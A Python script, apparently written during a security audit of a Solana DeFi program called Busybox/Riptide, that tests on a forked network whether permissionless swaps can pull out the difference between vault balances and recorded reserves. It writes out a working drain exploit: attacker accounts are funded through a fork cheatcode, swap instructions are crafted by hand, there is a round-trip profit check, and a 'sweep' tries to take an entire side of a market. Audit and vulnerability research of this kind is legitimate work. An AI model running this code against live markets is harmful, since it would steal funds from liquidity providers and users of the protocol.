"""Busybox/Riptide v2.1.1: swap round-trip and reserves-vs-vault drain test.

Facts established by the tag sweep on the deployed ELF (evidence/BB_tagsweep.json):
  tag0 ProgramVersion ok; 1 OracleUpdate; 2 SwapExactIn and 3 SwapExactOut are IMPLEMENTED and
  permissionless (only the swapper signs); 4-7 ReservedSwapX/Y/Z/A and 13-15 ReservedMarketX/Y/Z are
  inert (InvalidInstructionData); 8 MarketInitialize reachable; 9-12 require the market authority.
Live state: 10 of 32 markets have vault token balances that differ from the stored reserves
(recon/busybox_atomic_per_market.json) - the divergence is what a swap can monetise.
This script measures whether a swap - or a swap round-trip - gives the caller more value back
than they put in.
"""
import sys, json, struct, base64
sys.path.insert(0, "/home/user/orca-audit/tools")
import forknet as F
from solders.instruction import Instruction
from solders.pubkey import Pubkey

BB = "riptK81hDxhe5pW5jSzSM9iRA8azgEgLJ4dXkPtBS7j"
actor = F.load_actor(); A = str(actor.pubkey())
DIV = json.load(open("/home/user/orca-audit/recon/busybox_atomic_per_market.json"))["rows"]
BY = {r["addr"]: r for r in DIV}


def prog_of(m):
    v = F.get_account(m)
    return (v or {}).get("owner") or F.TOKEN


def ata_of(o, m, p):
    return str(Pubkey.find_program_address([bytes(F.pk(o)), bytes(F.pk(p)), bytes(F.pk(m))], F.pk(F.ATA))[0])


def bal(a):
    v = F.get_account(a)
    if not v:
        return None
    raw = base64.b64decode(v["data"][0])
    return struct.unpack_from("<Q", raw, 64)[0] if v["space"] == 165 else None


def mkt_state(a):
    v = F.get_account(a)
    if not v:
        return None
    raw = base64.b64decode(v["data"][0])
    return {"disc": raw[0], "authority": F.b58(raw[8:40]), "updater": F.b58(raw[40:72]),
            "sequence": struct.unpack_from("<Q", raw, 136)[0],
            "validUntil": struct.unpack_from("<Q", raw, 144)[0],
            "minSpread": struct.unpack_from("<i", raw, 664)[0],
            "arbPenalty": struct.unpack_from("<I", raw, 668)[0],
            "cuPen": raw[2], "imbalance": raw[3],
            "reservesA": struct.unpack_from("<Q", raw, 736)[0],
            "reservesB": struct.unpack_from("<Q", raw, 744)[0]}


def decimals(m):
    v = F.get_account(m)
    return base64.b64decode(v["data"][0])[44] if v else None


def swap_ix(mkt, amount, is_a, partial=0, sl=None, tag=2, trader_a=None, trader_b=None):
    r = BY[mkt]
    mA, mB = r["mintA"], r["mintB"]
    pa, pb = r["pa"], r["pb"]
    va = trader_a or ata_of(A, mA, pa)
    vb = trader_b or ata_of(A, mB, pb)
    data = bytes([tag]) + struct.pack("<Q", amount) + bytes([1 if is_a else 0])
    data += bytes([0]) if sl is None else (bytes([1]) + struct.pack("<QQ", *sl) if isinstance(sl, tuple)
                                           else bytes([2]) + struct.pack("<Q", sl))
    data += bytes([partial])
    return Instruction(F.pk(BB), data, [
        F.AM(A, writable=True, signer=True), F.AM(mkt, writable=True),
        F.AM(mA, writable=True), F.AM(mB, writable=True),
        F.AM(va, writable=True), F.AM(vb, writable=True),
        F.AM(r["va"], writable=True), F.AM(r["vb"], writable=True),
        F.AM(pa), F.AM(pb), F.AM(F.MEMO), F.AM(F.IX_SYSVAR)])


def fund(addr, amount):
    v = F.get_account(addr)
    if not v:
        return {"skip": "absent"}
    raw = bytearray(base64.b64decode(v["data"][0]))
    struct.pack_into("<Q", raw, 64, amount)
    return F.rpc.rpc("surfnet_setAccount", [addr, {"lamports": v["lamports"], "data": bytes(raw).hex(),
                                                   "owner": v["owner"], "executable": False}], url=F.FORK)


RESULTS = []


def show(name, r, extra=""):
    det = r.get("detail", {})
    logs = [l.strip() for l in det.get("logs", [])]
    print(f"\n### {name} {extra}")
    print("   err:", json.dumps(det.get("err") or r.get("error"))[:130])
    print("   logs:", " | ".join(l.split("log:")[-1].strip() for l in logs if "log:" in l or "failed" in l)[:240])


def main():
    now = F.get_slot()
    cands = [r for r in DIV if r["balA"] is not None and r["balB"] is not None
             and (r["reservesA"] or 0) + (r["reservesB"] or 0) > 10 ** 6]
    print(f"candidate markets with both vaults and reserves: {len(cands)}")
    # the one market whose oracle is currently fresh AND has a vault surplus
    for r in cands:
        st = mkt_state(r["addr"])
        r["fresh"] = st and st["validUntil"] >= now
        r["state"] = st
        r["excessA"] = (r["balA"] or 0) - (st["reservesA"] if st else 0)
        r["excessB"] = (r["balB"] or 0) - (st["reservesB"] if st else 0)
    sel = [r for r in cands if r["fresh"] and (r["excessA"] > 0 or r["excessB"] > 0)]
    print("fresh-oracle markets with a vault surplus:", [(r["addr"][:12], r["excessA"], r["excessB"]) for r in sel])
    if not sel:
        sel = [r for r in cands if r["fresh"]][:1] or cands[:1]
    for r in sel[:3]:
        mkt = r["addr"]
        st = r["state"]
        print(f"\n=== market {mkt}\n  mints {r['mintA'][:14]}/{r['mintB'][:14]} "
              f"reserves {st['reservesA']:,}/{st['reservesB']:,} vault {r['balA']:,}/{r['balB']:,} "
              f"excess {r['excessA']:,}/{r['excessB']:,} minSpread={st['minSpread']} arbPen={st['arbPenalty']} cu={st['cuPen']}")
        pa, pb = r["pa"], r["pb"]
        u_a, u_b = ata_of(A, r["mintA"], pa), ata_of(A, r["mintB"], pb)
        for m, p in ((r["mintA"], pa), (r["mintB"], pb)):
            _, x = F.create_ata(A, m, p, A)
            F.send([x], actor)
        da, db = decimals(r["mintA"]), decimals(r["mintB"])
        amt_a, amt_b = 10 ** (da or 9), 10 ** (db or 6)
        fund(u_a, amt_a * 100)
        fund(u_b, amt_b * 100)
        watch = {"attackerA": u_a, "attackerB": u_b, "vaultA": r["va"], "vaultB": r["vb"]}
        b = {k: bal(v) for k, v in watch.items()}
        b["state"] = mkt_state(mkt)
        rr = F.send([swap_ix(mkt, amt_a, True)], actor)   # sell token A into the market
        show(f"BB-RT1 swapExactIn {amt_a} of tokenA (fee-on-transfer mintA={r['mintA'][:10]})", rr)
        a1 = {k: bal(v) for k, v in watch.items()}
        a1["state"] = mkt_state(mkt)
        rr2 = F.send([swap_ix(mkt, amt_b, False)], actor)  # buy token A back with B
        show(f"BB-RT2 swapExactOut {amt_b} of tokenB (round trip back)", rr2)
        a2 = {k: bal(v) for k, v in watch.items()}
        a2["state"] = mkt_state(mkt)
        net = {}
        for k in watch:
            net[k] = (a2[k] or 0) - (b[k] or 0)
        res = {"market": mkt, "mintA": r["mintA"], "mintB": r["mintB"], "decimals": [da, db],
               "before": b, "afterSellA": a1, "afterBuyBack": a2, "netDelta": net,
               "reservesBefore": (b["state"] or {}).get("reservesA"), "excessA": r["excessA"],
               "excessB": r["excessB"], "slot": F.get_slot()}
        RESULTS.append(res)
        print("   attacker/vault net after round trip:", json.dumps(net))
        gained = net["attackerA"]
        print(f"   >>> round-trip net tokenA change: {gained:+,}  "
              f"{'FREE VALUE EXTRACTED' if gained and gained > 0 else 'no positive round-trip delta'}")
        # surplus sweep: ask for exactly reserves + excess of the side that is over-funded
        side = "A" if r["excessA"] > 0 else "B"
        want = (st["reservesA"] if side == "A" else st["reservesB"])
        rr3 = F.send([swap_ix(mkt, want, side == "A", partial=1)], actor)
        show(f"BB-RT3 exact-IN sized to take the whole {side} side (partial fill allowed)", rr3)
        after = mkt_state(mkt)
        print("   vault after sweep:", bal(r["va"] if side == "A" else r["vb"]), "reserves:",
              after["reservesA"], after["reservesB"])
        RESULTS[-1]["sweepAttempt"] = {"side": side, "want": want,
                                       "err": (rr3.get("detail") or {}).get("err"),
                                       "vaultAfter": bal(r["va"] if side == "A" else r["vb"]),
                                       "stateAfter": after}
    json.dump({"forkSlot": now, "results": RESULTS,
               "fundingNote": "attacker's own ATAs funded by fork cheatcode so the swap reaches pricing; "
                              "no protocol-owned balance was fabricated"},
              open("/home/user/orca-audit/evidence/BBR_roundtrip.json", "w"), indent=1)
    print("\nsaved evidence/BBR_roundtrip.json")


if __name__ == "__main__":
    main()
